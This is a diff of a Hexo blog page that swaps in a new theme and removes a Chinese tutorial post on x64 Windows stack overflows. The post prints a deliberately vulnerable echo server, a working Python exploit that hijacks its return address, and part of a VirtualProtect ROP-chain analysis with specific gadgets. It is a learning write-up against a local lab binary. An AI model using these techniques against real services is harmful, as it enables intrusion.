@@ -1,351 +1,515 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/images/favicon-small.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="小林Sana">
+  <meta name="keywords" content="小林Sana">
+  
+    <meta property="og:type" content="website">
+<meta property="og:title" content="小林Sana">
+<meta property="og:url" content="https://kobayashi-san.github.io/index.html">
+<meta property="og:site_name" content="小林Sana">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="小林Sana">
+<meta property="article:tag" content="小林Sana">
+<meta name="twitter:card" content="summary_large_image">
+  
   
   
   <title>小林Sana</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="小林Sana">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="小林Sana">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link rel="alternate" href="/atom.xml" title="小林Sana" type="application/atom+xml">
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kobayashi-san.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 8.1.2"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">小林Sana</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>小林Sana</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-x64-windows-rop-r9-gadget" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/07/x64-windows-rop-r9-gadget/" class="article-date">
-  <time class="dt-published" datetime="2026-10-07T15:00:00.000Z" itemprop="datePublished">2026-10-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/07/x64-windows-rop-r9-gadget/">x64 Windows ROP 初体验：没有 pop r9 gadget 时怎么办</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>本文是我的 Windows ROP 的入门笔记。本文主要讲解了如何在没有开启 GS 和 DYNAMICBASE 保护时如何对具有栈溢出漏洞的程序进行利用。利用使用了两条路径：直接 ROP 和 VirtualProtect 修改内存页为 RWX 执行 shellcode。</p>
-<h2 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h2><p>编译命令：<code>cl /Zi /W4 /GS- .\echo.c /link /DYNAMICBASE:NO</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cl /Zi /W4 /GS- .\echo.c /link /DYNAMICBASE:NO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> echo[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You are win.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD old;</span><br><span class="line">	VirtualProtect(&amp;old, <span class="number">1</span>, PAGE_READWRITE, &amp;old);</span><br><span class="line"></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	SOCKET l = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	addr.sin_family = AF_INET;</span><br><span class="line">	addr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);</span><br><span class="line">	addr.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">	bind(l, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">	listen(l, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">2048</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		SOCKET c = accept(l, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span>* banner = <span class="string">&quot;Echo Server 1.0\n&quot;</span>;</span><br><span class="line">		send(c, banner, (<span class="type">int</span>)<span class="built_in">strlen</span>(banner), <span class="number">0</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="type">int</span> n = recv(c, buf, <span class="number">0x8F0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123; closesocket(c); <span class="keyword">break</span>; &#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(echo, buf);</span><br><span class="line">		send(c, echo, <span class="number">4096</span>, <span class="number">0</span>);</span><br><span class="line">		closesocket(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="关于-VirtualProtect-那两行"><a href="#关于-VirtualProtect-那两行" class="headerlink" title="关于 VirtualProtect 那两行"></a>关于 VirtualProtect 那两行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(&amp;old, <span class="number">1</span>, PAGE_READWRITE, &amp;old);</span><br></pre></td></tr></table></figure>
-
-<p>这两行代码是为了在导入表中留下 <code>VirtualProtect</code> 函数，简化调用。</p>
-<h3 id="关于-0x8f0"><a href="#关于-0x8f0" class="headerlink" title="关于 0x8f0"></a>关于 0x8f0</h3><p>在内核写入用户模式缓冲区时，内核会对缓冲区的权限进行校验，如果缓冲区所在的区域不可写，<code>recv</code> 函数会返回错误 WSAEFAULT（10014）。</p>
-<p>0x8f0 是 <code>recv</code> 函数接收客户端消息的最大长度。这个值是通过调试得来的。我们先启动 <code>echo.exe</code> ，然后再使用 windbg 附加上去，主线程的栈的最高地址是 <code>0x160000</code> 。</p>
-<p><img src="/images/stack-top.png" alt="主线程栈区域，最高地址 0x160000"></p>
-<p>服务端是单线程程序，阻塞在 <code>accept</code> 的线程就是主线程。在 WinDbg 的 Stack 窗口查看它的调用栈：</p>
-<p><img src="/images/stack-frames.png" alt="Stack 窗口中的主线程调用栈"></p>
-<p><code>0x15f520</code> 是 <code>main</code> 函数调用函数前的 rsp，而 <code>main</code> 函数的局部变量 <code>buf</code> 在 <code>rsp+0x1f0</code> 处。</p>
-<p>我们使用 <code>0x160000</code> 减去 <code>0x15f520 + 0x1f0</code>（<code>buf</code> 的地址）就得到了 <code>0x8f0</code>。</p>
-<p>这张调用栈截图还顺带回答了另一个问题：<code>[0x5]</code> 帧（<code>main</code> 的调用者）的 Child-SP 是 <code>0x15ff20</code>，即 <code>main</code> 的返回地址位于 <code>0x15ff18</code>，从它到栈上边界 <code>0x160000</code> 只剩 <code>0xE8</code> 字节。本文最终的 ROP 链共 29 个栈槽，总长恰好 <code>0x8F0</code>，链尾正好顶在栈上边界上——一个多余的 gadget 都放不下，后文链的紧凑设计全部是被这个约束逼出来的。</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这是一个 TCP 服务器，监听 9999 端口。客户端连接时，服务端发送 <code>Echo Server 1.0\n</code> 字符串到客户端，服务端接收客户端消息并写入栈缓冲区 <code>buf</code> 中，随后复制消息到全局缓冲区 <code>echo</code> 中，最后服务端回显客户端的消息。</p>
-<p>如果接收到的消息长度 &lt;&#x3D; 0 则会停止接收消息，<code>main</code> 函数退出。</p>
-<p>接收消息大小最多为 0x8F0 字节，栈缓冲区大小为 2048（0x800） 字节。如果客户端发送的消息大小超过 2048 字节，则会撑爆缓冲区，导致栈溢出。</p>
-<h2 id="栈帧与调用约定"><a href="#栈帧与调用约定" class="headerlink" title="栈帧与调用约定"></a>栈帧与调用约定</h2><p>我们先讲解一下 Windows 函数调用栈的结构。以<code>main</code> 函数调用 <code>strcpy</code> 函数为例，内存示意图如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0x1008 | &amp;send(c, echo, 4096, 0); | &lt;- strcpy 调用的下一条指令地址（C 源码）</span><br><span class="line">0x1010 |     home space (rcx)     | &lt;- shadow space</span><br><span class="line">0x1018 |     home space (rdx)     |</span><br><span class="line">0x1020 |     home space (r8)      |</span><br><span class="line">0x1028 |     home space (r9)      |</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>Windows x64 ABI 使用寄存器传递函数调用的前四个参数，依次是 <code>rcx</code>、<code>rdx</code>、<code>r8</code> 和 <code>r9</code> ，其余的使用栈传递。</p>
-<p>相较于 Linux 的 System V AMD64 ABI，Windows 的 x64 ABI 要求调用者必须将栈指针（RSP）至少减少 0x20 字节，用于被调用者保存 <code>rcx</code>、<code>rdx</code>、<code>r8</code> 和 <code>r9</code> 四个易失寄存器。当然这部分空间也可以在 <code>main</code> 函数的序言中和局部变量统一分配。</p>
-<p>如果我们仔细观察 IDA，就会发现 <code>main</code> 函数第一个局部变量位于 <code>rsp+0x20</code> 处，未使用的这部分空间就是 shadow space。</p>
-<p>当然，Windows x64 ABI 也要求调用函数前 rsp 对齐 0x10 字节，也就是函数入口的 rsp 以 8 结尾。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="直接-ROP"><a href="#直接-ROP" class="headerlink" title="直接 ROP"></a>直接 ROP</h3><p>我使用 ROP 的思路很简单：劫持 <code>main</code> 函数的返回地址为 <code>win</code> 函数的起始地址。</p>
-<p>使用 IDA 查看栈变量，有注释 <code>[rbp-808h]</code>，这说明 <code>buf</code> 距离返回地址 <code>0x808</code> 字节。</p>
-<p><code>char buf[2048]; // [rsp+1F0h] [rbp-808h] BYREF</code></p>
-<p><code>buf</code> 本身占 <code>0x800</code> 字节，与返回地址之间还有 <code>8</code> 字节的对齐 padding，因此 padding 长度取 <code>0x808</code>。</p>
-<p>再双击 <code>buf</code> 变量，向下翻，发现没有保存的 <code>rbp</code> 寄存器，只有返回地址。</p>
-<p><img src="/images/ida-frame.png" alt="IDA 栈帧视图：没有保存的 rbp，只有返回地址"></p>
-<p>所以我们只需要 <code>0x808</code> 字节的 padding。</p>
-<p>因为我们只调用 <code>win</code> 一个函数，不关心 shadow space，我们只关心栈对齐。</p>
-<p>根据上面的示意图，如果直接调用 <code>win</code>，那么 <code>win</code> 的入口处 <code>rsp</code> 以 0 结尾，如果我们先垫一个 <code>ret</code> gadget，那么 <code>win</code> 入口的 <code>rsp</code> 以 8 结尾，栈就对齐了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">0x1000</span>).decode())</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x0000000140007230</span></span><br><span class="line">ret = <span class="number">0x0000000140001371</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x808</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQ&#x27;</span>, ret, win)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">0x1000</span>)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
-<h3 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h3><p>VirtualProtect 利用链的思路是先通过 <code>strcpy</code> 向 <code>echo</code> 写入无 <code>\x00</code> 的 shellcode，然后调用 <code>VirtualProtect(echo, 0x1000, 0x40, 可写地址);</code>，最后跳转到 <code>echo</code> 执行任意代码。</p>
-<p>使用 ROPgadget 搜索整个 PE 文件，得到了 <code>pop rcx ; cld ; ret</code> 和 <code>pop rdx ; ret</code> 的 gadget。但是 VirtualProtect 有四个参数，<code>r8</code> 和 <code>r9</code> 的内容如何控制呢。</p>
-<h4 id="r8"><a href="#r8" class="headerlink" title="r8"></a>r8</h4><p>关于 r8，我找到了一个 pop gadget：<code>pop r8 ; mov ecx, dword ptr [rcx] ; add rsp, 0x20 ; pop rbp ; jmp 0x1400034b3</code>。<code>rcx</code> 指向一个可读地址即可。但是最后有一个无条件跳转看起来有点棘手，跟踪一下。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">j___acrt_unlock</span><span class="params">(__acrt_lock_id _Lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  _acrt_unlock(_Lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall _acrt_unlock(__acrt_lock_id _Lock)</span><br><span class="line">&#123;</span><br><span class="line">  LeaveCriticalSection(&amp;_acrt_lock_table[_Lock]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个 IAT 导入桩，调用了 <code>LeaveCriticalSection</code> 这个外部函数，前面的 <code>mov ecx, dword ptr [rcx]</code> 是在取 <code>_Lock</code>。</p>
-<p><code>_acrt_lock_table</code> 是一个 <code>RTL_CRITICAL_SECTION</code> 数组，长度为 15。查看 ReactOS 的源码发现<code>_Lock</code> 的值可以取 0 ~ 13，我这里用的 4。</p>
-<p>如何让 <code>_Lock</code> 为 4 呢？因为这是一个 <code>DWORD</code> 值，直接从 PE 内存中搜索 <code>04 00 00 00</code> 这四个字节就可以了， windbg 搜索命令 <code>s 0x140000000 L0xbb000 04 00 00 00</code>。</p>
-<p>控制了 r8，就可以尝试控制 r9 了。</p>
-<h4 id="r9"><a href="#r9" class="headerlink" title="r9"></a>r9</h4><p>r9 没有 pop gadget，但是有一条 mov gadget：<code>mov r9, rax ; jmp 0x14003b941</code>，我们看一看 <code>0x14003b941</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:000000014003B941 loc_14003B941:</span><br><span class="line">.text:000000014003B941                 mov     r8d, [this+30h]</span><br><span class="line">.text:000000014003B945                 test    r8d, r8d</span><br><span class="line">.text:000000014003B948                 jg      short loc_14003B94F</span><br><span class="line">.text:000000014003B94A                 test    r10d, r10d</span><br><span class="line">.text:000000014003B94D                 jz      short loc_14003B992</span><br><span class="line">.text:000000014003B992 loc_14003B992:</span><br><span class="line">.text:000000014003B992                 sub     rdx, rax</span><br><span class="line">.text:000000014003B995                 add     rax, 2</span><br><span class="line">.text:000000014003B999                 sar     rdx, 1</span><br><span class="line">.text:000000014003B99C                 mov     [this+48h], number</span><br><span class="line">.text:000000014003B99F                 mov     [this+40h], rax</span><br><span class="line">.text:000000014003B9A3                 retn</span><br></pre></td></tr></table></figure>
-
-<p>如果 <code>dword [rcx+0x30] &lt;= 0 &amp;&amp; r10d == 0</code> 则会跳出循环。但我们很难去控制 r10d，我们看看整个函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __crt_stdio_output::f&lt;<span class="type">wchar_t</span>,__crt_stdio_output::stream_output_adapter&lt;<span class="type">wchar_t</span>&gt;,__crt_stdio_output::format_validation_base&lt;<span class="type">wchar_t</span>,__crt_stdio_output::stream_output_adapter&lt;<span class="type">wchar_t</span>&gt;&gt;&gt;::type_case_integer_parse_into_buffer&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="number">16</span>&gt;(</span><br><span class="line">        __crt_stdio_output::output_processor&lt;<span class="type">wchar_t</span>,__crt_stdio_output::stream_output_adapter&lt;<span class="type">wchar_t</span>&gt;,__crt_stdio_output::format_validation_base&lt;<span class="type">wchar_t</span>,__crt_stdio_output::stream_output_adapter&lt;<span class="type">wchar_t</span>&gt; &gt; &gt; *this,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> number,</span><br><span class="line">        <span class="type">const</span> <span class="type">bool</span> capital_hexits)</span><br><span class="line">&#123;</span><br><span class="line">  __crt_stdio_output::formatting_buffer *p_buffer; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *narrow_string; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> precision; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  __int16 v12; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v13; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  p_buffer = &amp;this-&gt;_buffer;</span><br><span class="line">  <span class="keyword">if</span> ( this-&gt;_buffer._dynamic_buffer._p )</span><br><span class="line">  &#123;</span><br><span class="line">    p_buffer = (__crt_stdio_output::formatting_buffer *)this-&gt;_buffer._dynamic_buffer._p;</span><br><span class="line">    v6 = this-&gt;_buffer._dynamic_buffer_size &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">256</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = &amp;p_buffer-&gt;_member_buffer[<span class="number">2</span> * v6 - <span class="number">2</span>];</span><br><span class="line">  this-&gt;_narrow_string = v7;</span><br><span class="line">  narrow_string = v7;</span><br><span class="line">  <span class="keyword">for</span> ( i = v7; ; i = narrow_string )</span><br><span class="line">  &#123;</span><br><span class="line">    precision = this-&gt;_precision;</span><br><span class="line">    <span class="keyword">if</span> ( precision &lt;= <span class="number">0</span> &amp;&amp; !number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v11 = precision - <span class="number">1</span>;</span><br><span class="line">    v12 = number &amp; <span class="number">0xF</span>;</span><br><span class="line">    number &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    v13 = v12 + <span class="number">48</span>;</span><br><span class="line">    this-&gt;_precision = v11;</span><br><span class="line">    <span class="keyword">if</span> ( v13 &gt; <span class="number">0x39u</span> )</span><br><span class="line">      v13 = (<span class="type">unsigned</span> __int8)(v13 + <span class="number">32</span> * !capital_hexits + <span class="number">7</span>);</span><br><span class="line">    *(_WORD *)i = v13;</span><br><span class="line">    this-&gt;_narrow_string -= <span class="number">2</span>;</span><br><span class="line">    narrow_string = this-&gt;_narrow_string;</span><br><span class="line">  &#125;</span><br><span class="line">  this-&gt;_string_length = (v7 - narrow_string) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  this-&gt;_narrow_string = narrow_string + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>观察一下变量的注释，发现 r9 先后是 <code>p_buffer</code> 指针和循环变量 <code>i</code>。如果我们可以控制循环变量 <code>i</code>，就可以控制 r9（残留值）。</p>
-<p>我们可以通过控制函数参数 <code>number == 0</code> 并且 <code>dword [this+0x30] == 0</code> 直接跳出循环。</p>
